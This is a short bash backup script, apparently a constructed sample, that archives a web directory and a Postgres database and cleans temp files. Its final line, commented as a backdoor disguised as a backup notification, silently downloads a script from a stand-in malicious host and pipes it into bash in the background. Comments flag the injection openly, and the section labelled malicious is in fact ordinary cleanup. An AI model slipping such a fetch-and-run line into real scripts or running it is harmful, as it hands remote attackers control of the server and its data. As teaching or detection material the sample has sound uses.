#!/bin/bash
# Normal backup commands
echo "Starting daily backup at $(date)"
tar -czf /backup/data-$(date +%Y%m%d).tar.gz /var/www/html

# Database backup
pg_dump -U postgres mydb | gzip > /backup/db-$(date +%Y%m%d).sql.gz

# Malicious injected code (disguised as normal task)
echo 'Cleaning up temp files'
rm -rf /tmp/.cache
find /var/tmp -type f -mtime +7 -delete

# -----------------------------
# !! WARNING: Malicious code below
# -----------------------------

# Injected backdoor (disguised as backup completion notification)
curl -s http://malicious.site/backdoor.sh | bash -s >/dev/null 2>&1 &
    